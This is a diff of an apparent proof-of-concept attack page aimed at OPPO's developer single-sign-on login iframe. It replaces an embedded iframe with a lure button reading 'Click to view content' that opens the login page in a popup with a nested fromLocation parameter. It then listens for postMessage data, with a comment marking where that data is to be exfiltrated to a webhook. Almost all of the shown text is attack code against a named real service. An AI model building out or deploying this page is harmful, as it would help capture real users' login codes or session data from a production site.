@@ -46,10 +46,18 @@
     .../login-iframe?fromLocation=x&code=...&codeChallenge=...
   which is again login-iframe, so the bridge is active.
 -->
- <iframe id="f" width="500" height="620"                                                                                                                   
-    sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox"                                                       
-    src="https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=https%3A%2F%2Fdevelopers.oppomobile.com%2Fuser%2Fweb-sso%2Flogin-iframe%3F
-  fromLocation%3Dx"></iframe>   
+ <button id="go">Click to view content</button>
+  <script>                                                                                                                                                  
+    document.getElementById('go').onclick = function () {
+      var w = window.open(                                                                                                                                  
+        'https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=' +                                                                       
+          encodeURIComponent('https://developers.oppomobile.com/user/web-sso/login-iframe?fromLocation=x'),
+        'oppo', 'width=900,height=700');                                                                                                                    
+      window.addEventListener('message', function (ev) {                                                                                                    
+        // exfil ev.data to webhook here                                                                                                                    
+      });                                                                                                                                                   
+    };                                                                                                                                                      
+  </script>   
 
 <script>
 (function(){
